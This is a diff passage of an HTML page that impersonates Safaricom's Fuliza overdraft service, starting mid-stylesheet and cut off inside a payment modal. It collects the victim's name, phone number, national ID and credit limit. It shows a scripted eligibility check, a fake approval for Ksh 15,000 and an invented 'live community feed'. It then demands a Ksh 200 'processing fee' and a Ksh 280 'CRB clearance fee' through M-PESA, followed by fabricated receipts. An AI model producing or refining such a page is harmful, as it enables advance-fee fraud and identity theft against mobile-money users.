+        .proc-status-text { font-weight: 700; font-size: 0.85rem; color: #212529; margin-top: 4px; }
+        .proc-dots { display: flex; gap: 6px; margin-top: 2px; }
+        @media (max-width: 420px) { .proc-dots { justify-content: center; margin-bottom: 8px; } }
+        .proc-dots span { width: 8px; height: 8px; background-color: #3b82f6; border-radius: 50%; animation: procDotPulse 1.2s infinite ease-in-out both; }
+        .proc-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .proc-dots span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes procDotPulse { 0%,80%,100% { transform: scale(0); } 40% { transform: scale(1); } }
+        .proc-right { font-size: 0.72rem; color: #6c757d; line-height: 1.45; border-left: 1px solid #e9ecef; padding-left: 20px; text-align: left; }
+        @media (max-width: 420px) { .proc-right { border-left: none; padding-left: 0; border-top: 1px solid #e9ecef; padding-top: 16px; text-align: center; } }
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 3000; padding: 20px; }
+        .modal-overlay.open { display: flex; }
+        .modal-box { background: white; border-radius: 20px; padding: 28px 24px; width: 100%; max-width: 400px; animation: modalIn 0.25s ease; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.25); }
+        @keyframes modalIn { from { opacity:0; transform:scale(0.95) translateY(16px); } to { opacity:1; transform:scale(1) translateY(0); } }
+        .modal-icon { width: 56px; height: 56px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.6rem; }
+        .modal-icon.success { background: #e8f5e9; color: var(--primary); }
+        .modal-icon.error { background: #fce4ec; color: var(--red); }
+        .modal-icon.warning { background: #fff3e0; color: #e65100; }
+        .modal-title { font-size: 1.25rem; font-weight: 800; margin-bottom: 6px; }
+        .modal-desc { font-size: 0.85rem; color: #6c757d; margin-bottom: 16px; line-height: 1.45; }
+        .modal-phone-group { display: flex; border: 1.5px solid var(--border); border-radius: 10px; overflow: hidden; margin: 8px 0 12px; }
+        .modal-phone-group .prefix { background: var(--gray); padding: 12px 14px; font-weight: 600; border-right: 1.5px solid var(--border); color: #333; display: flex; align-items: center; }
+        .modal-phone-group input { flex: 1; border: none; padding: 12px 14px; font-family: inherit; font-size: 0.95rem; outline: none; }
+        .modal-status { font-size: 0.75rem; padding: 8px 12px; border-radius: 8px; margin: 10px 0; display: none; font-weight: 500; line-height: 1.3; }
+        .modal-status.show { display: block; }
+        .modal-status.pending { background: #fff8e1; color: #e65100; }
+        .modal-status.success { background: #e8f5e9; color: #0ca678; }
+        .modal-status.error { background: #fce4ec; color: var(--red); }
+        .feed-container { max-height: 220px; overflow-y: auto; padding-right: 4px; }
+        .feed-item { display: flex; align-items: flex-start; gap: 10px; padding: 10px 12px; border-bottom: 1px solid #f0f0f0; animation: slideIn 0.3s ease; text-align: left; }
+        .feed-item:last-child { border-bottom: none; }
+        @keyframes slideIn { from { opacity:0; transform:translateX(-10px); } to { opacity:1; transform:none; } }
+        .feed-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.8rem; color: white; flex-shrink: 0; }
+        .feed-content { flex: 1; }
+        .feed-name { font-weight: 700; font-size: 0.85rem; color: #212529; }
+        .feed-name .verified { color: #0ca678; font-size: 0.65rem; margin-left: 4px; font-weight: 600; }
+        .feed-text { font-size: 0.8rem; color: #495057; margin-top: 2px; line-height: 1.35; }
+        .feed-time { font-size: 0.65rem; color: #868e96; margin-top: 2px; }
+        .feed-live { display: inline-block; background: var(--red); color: white; font-size: 0.55rem; font-weight: 800; padding: 2px 8px; border-radius: 10px; animation: pulse 1.5s infinite; letter-spacing: 0.3px; }
+        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+        .nav-header { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+        .back-btn { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #ffffff; display: flex; align-items: center; justify-content: center; width: 36px; height: 36px; border-radius: 50%; transition: background 0.2s; }
+        .back-btn:hover { background: rgba(255,255,255,0.15); }
+        .footer { text-align: center; padding: 20px 16px 0; font-size: 0.65rem; color: rgba(255,255,255,0.65); line-height: 1.5; max-width: 440px; width: 100%; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #212529; color: white; padding: 12px 24px; border-radius: 12px; font-size: 0.85rem; font-weight: 600; z-index: 4000; display: none; max-width: 90%; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .toast.show { display: block; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
+        .spinner { width: 18px; height: 18px; border: 2px solid #e0e0e0; border-top-color: #ffffff; border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block; }
+        .stk-waiting-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 5000; padding: 20px; }
+        .stk-waiting-overlay.open { display: flex; }
+        .stk-waiting-box { background: white; border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; animation: fadeIn 0.3s ease; }
+        .stk-waiting-box .pulse-icon { width: 72px; height: 72px; border: 6px solid #e0e0e0; border-top-color: #0d5f2f; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        .stk-waiting-box .title { font-size: 1.2rem; font-weight: 800; color: #1b49b5; margin-bottom: 8px; }
+        .stk-waiting-box .sub { font-size: 0.9rem; color: #333; margin-bottom: 6px; }
+        .stk-waiting-box .phone { font-weight: 700; color: #0d5f2f; }
+        .stk-waiting-box .dots { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
+        .stk-waiting-box .dots span { width: 10px; height: 10px; background: #1b49b5; border-radius: 50%; animation: procDotPulse 1.2s infinite ease-in-out both; }
+        .stk-waiting-box .dots span:nth-child(1) { animation-delay: -0.32s; }
+        .stk-waiting-box .dots span:nth-child(2) { animation-delay: -0.16s; }
+        .stk-waiting-box .listening { background: #e8f5e9; border-radius: 24px; padding: 8px 16px; font-size: 0.78rem; color: #0d5f2f; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; }
+        .stk-waiting-box .listening .dot { width: 8px; height: 8px; background: #0ca678; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
+        .stk-waiting-box .note { font-size: 0.68rem; color: #adb5bd; margin-top: 14px; }
+        /* Processing Fee Confirmed Overlay */
+        #processingFeeConfirmedOverlay .modal-box .big-check { width: 70px; height: 70px; background: linear-gradient(135deg,#0d5f2f,#0ca678); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0 auto 16px; color: white; }
+        #processingFeeConfirmedOverlay .modal-box .title { font-size: 1.3rem; font-weight: 900; color: #0d5f2f; margin-bottom: 8px; }
+        #processingFeeConfirmedOverlay .modal-box .sub { font-size: 0.88rem; color: #495057; }
+        #processingFeeConfirmedOverlay .modal-box .receipt { font-size: 0.78rem; color: #6c757d; }
+        #processingFeeConfirmedOverlay .modal-box .spinner-dots { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
+        #processingFeeConfirmedOverlay .modal-box .spinner-dots span { width: 10px; height: 10px; background: #0d5f2f; border-radius: 50%; animation: procDotPulse 1.2s infinite ease-in-out both; }
+        #processingFeeConfirmedOverlay .modal-box .spinner-dots span:nth-child(1) { animation-delay: -0.32s; }
+        #processingFeeConfirmedOverlay .modal-box .spinner-dots span:nth-child(2) { animation-delay: -0.16s; }
+        .fee-section { background: #f5edd6; border: 2px solid #c9a84c; border-radius: 12px; padding: 16px 18px; margin: 16px 0; text-align: center; }
+        .fee-section .fee-label { font-size: 0.72rem; color: #666; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+        .fee-section .fee-amount { font-size: 2rem; font-weight: 900; color: #b85c00; margin: 4px 0; }
+        .fee-section .fee-sub { font-size: 0.75rem; color: #555; font-weight: 500; }
+        /* Final Success Page */
+        .success-summary { background: #f0faf4; border: 1px solid #b2dfdb; border-radius: 12px; padding: 14px; margin: 16px 0; text-align: left; font-size: 0.82rem; }
+        .success-summary .summary-title { font-weight: 800; color: #0d5f2f; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
+        .success-summary .summary-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .success-summary .summary-row:last-child { margin-bottom: 0; }
+        .success-summary .summary-row .label { color: #6c757d; }
+        .success-summary .summary-row .value { font-weight: 700; color: #212529; }
+        .success-summary .summary-row .value.amount { color: #0d5f2f; }
+        .success-summary .summary-row .value.network { color: #0d5f2f; }
+        .sending-indicator { display: inline-flex; align-items: center; gap: 8px; font-size: 0.82rem; color: #0ca678; font-weight: 700; margin-bottom: 12px; justify-content: center; width: 100%; }
+        .sending-indicator .dot { width: 10px; height: 10px; background: #0ca678; border-radius: 50%; display: inline-block; }
     </style>
 </head>
 <body style="background: #1a7a3a !important;">
 
-    <!-- ─── TOAST (no‑op, kept for compatibility) ─── -->
+    <!-- ─── TOAST ─── -->
     <div id="toast" class="toast"></div>
 
     <!-- =============================================================
-    PAGE 0: WELCOME
+    PAGE 0: WELCOME PAGE
     ============================================================= -->
     <div id="welcomePage" class="page active">
         <div style="background:#ffffff; width:100%; display:flex; justify-content:center; align-items:center; padding: 24px 16px;">
             <div style="display:flex; flex-direction:column; align-items:center; padding:10px 0;">
                 <div style="font-size:2.4rem; font-weight:900; color:#1a7a3a; letter-spacing:3px; line-height:1.1;">FULIZA</div>
                 <div style="font-size:0.9rem; font-weight:800; color:#c62828; letter-spacing:2px; margin-top:2px;">SAFARICOM</div>
-                <div style="font-size:0.65rem; font-weight:600; color:#555; letter-spacing:1px; margin-top:4px;">OVERDRAFT • KENYA</div>
+                <div style="font-size:0.65rem; font-weight:600; color:#555; letter-spacing:1px; margin-top:4px;">Empowering Kenyans 🇰🇪</div>
             </div>
         </div>
 
-        <div class="container">
-            <div class="card-content">
-                <div class="card-title">💳 Request Fuliza</div>
-                <div class="card-sub">Enter your Safaricom line and the amount you need.<br />A one‑time processing fee applies.</div>
-
-                <div class="form-group">
-                    <label>M-PESA Phone Number <span class="required">*</span></label>
-                    <div class="input-wrapper" id="phoneWrapper">
-                        <input type="tel" id="phoneInput" placeholder="e.g. 0712345678" maxlength="10" inputmode="numeric" />
-                        <span class="status-icon"></span>
+        <div style="background:#1a7a3a; width:100%; display:flex; flex-direction:column; align-items:center; padding: 32px 16px 60px; min-height: calc(100vh - 143px);">
+            <div class="container">
+                <div class="card-content" style="padding: 32px 24px;">
+                    <div style="font-size: 1.05rem; font-weight: 500; color: #212529; line-height: 1.6; margin-bottom: 28px;">
+                        Hi 👋, Welcome to <strong>FULIZA SAFARICOM KENYA</strong>. We are going to take you through some few questions before you receive your funds. Are you ready for that?
                     </div>
-                    <div class="error-msg" id="phoneError">Please enter a valid 10‑digit Safaricom number.</div>
+                    <button class="btn-primary" style="background:#1a7a3a; margin-bottom: 12px; margin-top: 0;" onclick="startApplication()">
+                        Yes
+                    </button>
+                    <button class="btn-primary" style="background:#1a7a3a; margin-top: 0;" onclick="showToast('You must select Yes to request eligibility checks.')">
+                        No
+                    </button>
                 </div>
-
-                <div class="form-group">
-                    <label>Amount (KES) <span class="required">*</span></label>
-                    <div class="input-wrapper" id="amountWrapper">
-                        <input type="number" id="amountInput" placeholder="e.g. 500" min="1" inputmode="numeric" />
-                        <span class="status-icon"></span>
-                    </div>
-                    <div class="error-msg" id="amountError">Enter an amount between 1 and 70,000 KES.</div>
-                </div>
-
-                <button class="btn-primary btn-green" id="continueBtn">Continue →</button>
-
-                <div style="margin-top:18px; font-size:0.65rem; color:#868e96; text-align:center; line-height:1.5;">
-                    By continuing you agree to the Fuliza Terms &amp; Conditions.<br />
-                    Processing fee applies.
-                </div>
+            </div>
+            <div class="footer">
+                Fuliza Safaricom · Empowering Kenyans 🇰🇪
             </div>
         </div>
     </div>
 
     <!-- =============================================================
-    PAGE 1: ELIGIBILITY CHECK
+    FORMS AREA
     ============================================================= -->
-    <div id="eligibilityPage" class="page">
+    <div class="viewport-wrapper" id="formsArea" style="display:none;">
+
+        <div class="header-pill">
+            <span>🇰🇪 FULIZA SAFARICOM KENYA</span>
+        </div>
+
         <div class="container">
-            <div class="card-header-green">
-                <div class="step-info">Step 1 of 3</div>
-                <div class="step-title">🔍 Checking Eligibility</div>
-                <div class="step-sub">Please wait while we verify your account status.</div>
+
+            <!-- ==========================================================
+            STEP 1: APPLICATION (SIMPLIFIED)
+            ========================================================== -->
+            <div id="step1" class="page">
+                <div class="card-content">
+                    <div class="card-title">Kindly submit the following requirements</div>
+                    <div class="card-sub">Fields marked <span class="required">*</span> are required</div>
+
+                    <form id="appForm" onsubmit="submitApplication(event)" novalidate>
+
+                        <div class="form-group">
+                            <label>Full Name <span class="required">*</span></label>
+                            <div class="input-wrapper" id="fullNameWrapper">
+                                <input type="text" id="fullName" placeholder="Enter full name" required>
+                                <span class="status-icon"></span>
+                            </div>
+                            <div class="error-msg" id="nameError">Name must contain letters only.</div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Phone Number <span class="required">*</span></label>
+                                <div class="input-wrapper" id="phoneNumberWrapper">
+                                    <input type="tel" id="phoneNumber" placeholder="e.g. 0712345678" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>National ID <span class="required">*</span></label>
+                                <div class="input-wrapper" id="nationalIdWrapper">
+                                    <input type="text" id="nationalId" placeholder="e.g. 12345678" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Email Address</label>
+                                <div class="input-wrapper" id="emailWrapper">
+                                    <input type="email" id="email" placeholder="e.g. name@example.com">
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>Current Fuliza Limit (KSh) <span class="required">*</span></label>
+                                <div class="input-wrapper" id="currentLimitWrapper">
+                                    <input type="number" id="currentLimit" placeholder="e.g. 700" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn-primary">
+                            Submit Application
+                        </button>
+                    </form>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
             </div>
-            <div class="card-body-white">
-                <div style="display:flex; flex-direction:column; align-items:center; padding:12px 0;">
+
+            <!-- ==========================================================
+            CHECKING ELIGIBILITY ANIMATED PAGE
+            ========================================================== -->
+            <div id="checkingPage" class="page">
+                <div class="card-content" style="text-align: center; padding: 32px 20px;">
                     <div class="eligibility-spinner"></div>
-                    <div style="font-weight:700; font-size:0.95rem; color:#212529;">Verifying your Fuliza limit…</div>
-                    <div style="font-size:0.75rem; color:#6c757d; margin-top:6px;">This takes a few seconds</div>
-                </div>
-                <div style="margin-top:8px;">
-                    <div class="check-item pending" id="check1"><div class="check-circle"></div><span>Checking account status</span></div>
-                    <div class="check-item pending" id="check2"><div class="check-circle"></div><span>Verifying limit availability</span></div>
-                    <div class="check-item pending" id="check3"><div class="check-circle"></div><span>Confirming KYC details</span></div>
+                    <div style="font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px;">Checking your eligibility...</div>
+                    <div style="font-size: 0.85rem; color: #6c757d; margin-bottom: 24px;" id="checkingSubtext">Hold on jon, we're reviewing your application.</div>
+
+                    <div class="check-item pending" id="check1"><div class="check-circle"></div><div style="font-size: 0.88rem;">Verifying national ID...</div></div>
+                    <div class="check-item pending" id="check2"><div class="check-circle"></div><div style="font-size: 0.88rem;">Checking phone number registration...</div></div>
+                    <div class="check-item pending" id="check3"><div class="check-circle"></div><div style="font-size: 0.88rem;">Reviewing Fuliza eligibility...</div></div>
+                    <div class="check-item pending" id="check4"><div class="check-circle"></div><div style="font-size: 0.88rem;">Confirming account status...</div></div>
+                    <div class="check-item pending" id="check5"><div class="check-circle"></div><div style="font-size: 0.88rem;">Calculating new limit tier...</div></div>
                 </div>
             </div>
+
+            <!-- ==========================================================
+            STEP 3: APPROVED AMOUNT (Withdraw Button)
+            ========================================================== -->
+            <div id="step3" class="page">
+                <div class="card-header-green">
+                    <div class="step-info">Step 3 of 5 · Approved</div>
+                    <div class="step-title" style="font-size: 1.25rem; font-weight: 800; margin-bottom: 6px;" id="approvedGreeting">🎉 Congratulations, JON MO!</div>
+                    <div class="step-sub" style="font-size: 0.82rem; opacity: 0.95; line-height: 1.45;">You have been approved for the following Fuliza Safaricom Fund amount. Click withdraw to proceed.</div>
+                </div>
+
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <!-- Approved Amount Display -->
+                    <div style="border: 1.5px solid #b4c6ef; background: #f0f5ff; border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 16px;">
+                        <div style="font-size: 0.72rem; color: #6c757d; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">YOUR APPROVED FULIZA SAFARICOM FUND</div>
+                        <div style="font-size: 2.6rem; font-weight: 900; color: #0d5f2f; margin: 4px 0;">Ksh 15,000</div>
+                        <div style="font-size: 0.75rem; color: #1b49b5; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                            <span>✓</span> Eligibility verified
+                        </div>
+                    </div>
+
+                    <button class="btn-primary btn-green" style="font-size: 1.05rem; margin-bottom: 10px; margin-top: 0; box-shadow: 0 4px 12px rgba(13, 95, 47, 0.2);" onclick="showProcessingFeePage()">
+                        💸 Withdraw Funds
+                    </button>
+
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 16px;">
+                        🔒 Secure M-PESA STK Push payment
+                    </div>
+
+                    <div style="margin-top: 8px; border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainer3"></div>
+                    </div>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            STEP 4: PROCESSING FEE PAGE (Ksh 200)
+            ========================================================== -->
+            <div id="processingFeePage" class="page">
+                <div class="card-header-gold">
+                    <div class="nav-header">
+                        <button class="back-btn" onclick="goToStep(3)">←</button>
+                    </div>
+                    <div class="step-info">Step 4 of 5 · Processing Fee</div>
+                    <div class="step-title">Processing Fee Required</div>
+                    <div class="step-sub">Pay the processing fee to continue with your fund disbursement.</div>
+                </div>
+
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <!-- Processing Fee Section -->
+                    <div class="fee-section">
+                        <div class="fee-label">Processing Fee</div>
+                        <div class="fee-amount">Ksh 200</div>
+                        <div class="fee-sub">Pay this fee to proceed with your fund disbursement</div>
+                    </div>
+
+                    <button class="btn-primary btn-gold" style="font-size: 1.05rem; margin-bottom: 10px; margin-top: 0; box-shadow: 0 4px 12px rgba(201, 168, 76, 0.3);" onclick="openProcessingFeePayment()">
+                        💰 Pay Ksh 200
+                    </button>
+
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 16px;">
+                        🔒 Secure M-PESA STK Push payment
+                    </div>
+
+                    <div style="margin-top: 8px; border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainerProc"></div>
+                    </div>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            STEP 5: CRB CLEARANCE PAGE (Ksh 280)
+            ========================================================== -->
+            <div id="crbPage" class="page">
+                <div class="card-header-red" style="background: #c62828; color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0;">
+                    <div style="font-size: 0.72rem; opacity: 0.9; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">Step 5 of 5 · CRB Clearance Required</div>
+                    <div class="step-title" style="font-size: 1.25rem; font-weight: 800; line-height: 1.3;">Clear with CRB to release your funds</div>
+                </div>
+
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <div style="background: #ffebee; border: 1px dashed #ef9a9a; border-radius: 12px; padding: 18px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                            <span style="font-size: 0.8rem; color: #c62828; font-weight: 700;">CRB Clearance Fee</span>
+                            <span style="font-size: 1.4rem; font-weight: 900; color: #c62828;">Ksh 280</span>
+                        </div>
+                        <div style="border-top: 1px dotted #ef9a9a; margin-bottom: 12px;"></div>
+                        <div style="font-size: 0.75rem; color: #c62828; text-align: center; font-weight: 600;">
+                            Paid via M-PESA STK push to <span id="crbPhoneDisplay">0710222875</span>
+                        </div>
+                    </div>
+
+                    <button class="btn-primary btn-red" style="font-size: 1.05rem; margin-bottom: 16px; margin-top: 0; box-shadow: 0 4px 12px rgba(198, 40, 40, 0.2);" onclick="openCRBPayment()">
+                        Pay Ksh 280 to Clear CRB →
+                    </button>
+
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 20px;">
+                        🔒 Secure payment · Funds released immediately after clearance
+                    </div>
+
+                    <div style="border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainerCRB"></div>
+                    </div>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            FINAL SUCCESS PAGE (All Fees Cleared!)
+            ========================================================== -->
+            <div id="allFeesClearedPage" class="page">
+                <div class="card-header-green" style="background: linear-gradient(135deg, #0d5f2f, #0ca678);">
+                    <div class="step-title" style="font-size: 1.4rem; font-weight: 900; margin-bottom: 6px;">✅ All Fees Cleared!</div>
+                    <div class="step-sub" style="font-size: 0.9rem; opacity: 0.95;">Processing fee of <strong>Ksh 200</strong> and CRB clearance fee of <strong>Ksh 280</strong> confirmed via M-PESA.</div>
+                </div>
+                <div class="card-body-white" style="padding: 20px;">
+                    <div style="font-size: 0.78rem; color: #6c757d; margin-bottom: 14px;">Receipt: <strong id="finalReceiptDisplay">UG9MDAR8EF</strong></div>
+                    <div class="success-summary">
+                        <div class="summary-title">🚀 DISBURSEMENT IN PROGRESS</div>
+                        <div class="summary-row"><span class="label">Fund Amount</span><span class="value amount">Ksh 5,000</span></div>
+                        <div class="summary-row"><span class="label">Network</span><span class="value network">🟢 Safaricom (M-PESA)</span></div>
+                        <div class="summary-row"><span class="label">Sending To</span><span class="value" id="finalPhoneDisplay">0725747225</span></div>
+                        <div class="summary-row"><span class="label">Processing Fee Paid</span><span class="value">Ksh 200</span></div>
+                        <div class="summary-row"><span class="label">CRB Clearance Fee Paid</span><span class="value">Ksh 280</span></div>
+                    </div>
+                    <div class="sending-indicator">
+                        <span class="dot"></span>
+                        Sending funds to your phone...
+                    </div>
+                    <div style="font-size: 0.75rem; color: #6c757d; text-align: center; margin-bottom: 16px;">Your Fuliza Safaricom funds will arrive within <strong>3 minutes</strong>. Keep your phone on and M-PESA active.</div>
+                    <button class="btn-primary btn-green" onclick="backToHome()">Back to Home</button>
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="footer">
+            Fuliza Safaricom · Empowering Kenyans 🇰🇪
         </div>
     </div>
 
     <!-- =============================================================
-    PAGE 2: OFFER (ELIGIBLE)
+    PROCESSING FEE PAYMENT MODAL
     ============================================================= -->
-    <div id="offerPage" class="page">
-        <div class="container">
-            <div class="card-header-green">
-                <div class="step-info">Step 2 of 3</div>
-                <div class="step-title">✅ You’re Pre‑Approved!</div>
-                <div class="step-sub">Review your Fuliza offer below.</div>
+    <div class="modal-overlay" id="processingFeeModal">
+        <div class="modal-box">
+            <div class="modal-icon warning"><span style="font-size:1.8rem;">🔒</span></div>
+            <div class="modal-title">Processing Fee Payment</div>
+            <div class="modal-desc">Pay Ksh 200 to process your Fuliza Safaricom fund disbursement.</div>
+            <div style="background:#f5edd6; padding:12px; border-radius:8px; margin-bottom:12px;">
+                <div style="font-size:0.7rem; color:#666;">Amount</div>
+                <div style="font-size:1.6rem; font-weight:800; color:#b85c00;">Ksh 200</div>
             </div>
-            <div class="card-body-white">
-                <div style="background:#f8f9fa; border-radius:12px; padding:16px; margin-bottom:16px; text-align:center;">
-                    <div style="font-size:0.7rem; color:#6c757d; font-weight:600; letter-spacing:0.5px;">REQUESTED AMOUNT</div>
-                    <div style="font-size:2rem; font-weight:900; color:#0d5f2f;" id="offerAmount">KES 0</div>
-                    <div style="font-size:0.75rem; color:#495057; margin-top:4px;">Available instantly</div>
-                </div>
-
-                <div style="background:#f5edd6; border:2px solid #c9a84c; border-radius:12px; padding:16px 18px; margin:16px 0; text-align:center;">
-                    <div class="fee-label">Processing Fee</div>
-                    <div class="fee-amount" id="offerFee">KES 0</div>
-                    <div class="fee-sub">One‑time charge • deducted from loan</div>
-                </div>
-
-                <div style="display:flex; gap:12px; margin-top:8px;">
-                    <button class="btn-primary btn-green" id="acceptOfferBtn" style="flex:2;">✔ Accept &amp; Proceed</button>
-                    <button class="btn-outline" id="declineOfferBtn" style="flex:1; padding:14px 0;">✕</button>
-                </div>
-                <div style="font-size:0.6rem; color:#adb5bd; text-align:center; margin-top:12px;">By accepting, you authorise the processing fee.</div>
+            <div class="modal-phone-group">
+                <span class="prefix">+254</span>
+                <input type="tel" id="procFeePhoneInput" placeholder="712345678">
             </div>
+            <div id="procFeeStatus" class="modal-status"></div>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-primary btn-gold" style="flex:1;" id="procFeePayBtn" onclick="processProcessingFee()">
+                    <span id="procFeePayText">Pay Ksh 200</span>
+                    <span id="procFeeSpinner" style="display:none;" class="spinner"></span>
+                </button>
+                <button class="btn-outline" style="flex:0.5; padding:14px;" onclick="closeProcFeeModal()">Cancel</button>
+            </div>
+            <div style="font-size:0.6rem; color:#999; margin-top:10px;">You will receive an M-Pesa STK push on your phone</div>
         </div>
     </div>
 
     <!-- =============================================================
-    PAGE 3: SUCCESS (neutral – no success/failure messages)
-    ============================================================= -->
-    <div id="successPage" class="page">
-        <div class="container">
-            <div class="card-header-green">
-                <div class="step-info">Complete</div>
-                <div class="step-title">✔ Transaction Processed</div>
-                <div class="step-sub">Your request has been submitted.</div>
-            </div>
-            <div class="card-body-white" style="text-align:center; padding:32px 20px;">
-                <div style="font-size:3rem; margin-bottom:12px;">📱</div>
-                <div style="font-weight:700; font-size:1.1rem; color:#212529;">Check your M-PESA</div>
-                <div style="font-size:0.85rem; color:#6c757d; margin-top:6px; max-width:280px; margin-left:auto; margin-right:auto;">
-                    You will receive a confirmation message shortly.
-                </div>
-                <button class="btn-primary btn-green" id="doneBtn" style="margin-top:24px;">Done</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- =============================================================
-    MODAL: Processing Fee Confirmed (kept)
+    PROCESSING FEE CONFIRMED OVERLAY
     ============================================================= -->
     <div class="modal-overlay" id="processingFeeConfirmedOverlay">
-        <div class="modal-box">
-            <div class="big-check">✓</div>
-            <div class="title">Processing Fee Confirmed</div>
-            <div class="sub">Your fee has been authorised. Initiating STK Push…</div>
+        <div class="modal-box" style="text-align:center;">
+            <div class="big-check">✅</div>
+            <div class="title">Processing Fee Confirmed!</div>
+            <div class="sub">Payment of <strong>Ksh 200</strong> received via M-PESA.</div>
+            <div class="receipt">Receipt: <strong id="procFeeReceiptDisplay">UG9MDARFZC</strong></div>
+            <div class="sub" style="margin-bottom:20px;">Proceeding to CRB clearance step...</div>
             <div class="spinner-dots"><span></span><span></span><span></span></div>
-            <div class="receipt" id="feeReceipt">Receipt: FUL-2026-••••</div>
+            <button class="btn-primary btn-green" onclick="proceedToCRB()">Continue → CRB Clearance</button>
         </div>
     </div>
 
     <!-- =============================================================
-    STK WAITING OVERLAY (kept)
+    CRB PAYMENT MODAL
+    ============================================================= -->
+    <div class="modal-overlay" id="crbModal">
+        <div class="modal-box">
+            <div class="modal-icon warning"><span style="font-size:1.8rem;">🔒</span></div>
+            <div class="modal-title">CRB Clearance Payment</div>
+            <div class="modal-desc">Pay Ksh 280 to clear your CRB and release your Fuliza Safaricom funds.</div>
+            <div style="background:#f5edd6; padding:12px; border-radius:8px; margin-bottom:12px;">
+                <div style="font-size:0.7rem; color:#666;">Amount</div>
